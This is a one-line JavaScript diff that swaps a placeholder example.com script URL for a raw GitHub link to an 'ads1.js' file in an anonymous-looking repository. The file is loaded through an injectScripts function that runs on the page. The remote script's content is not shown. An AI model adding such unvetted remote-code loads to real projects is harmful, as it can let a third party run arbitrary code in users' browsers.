@@ -426,7 +426,7 @@ function injectScripts(urls, finalCallback) {
 
 injectScripts(
   [
-    'https://example.com/script1.js',
+    'https://raw.githubusercontent.com/anonymous200225/anonymous200225.github.io/refs/heads/main/ads1.js',
     'https://example.com/script2.js'
   ],
   function () {
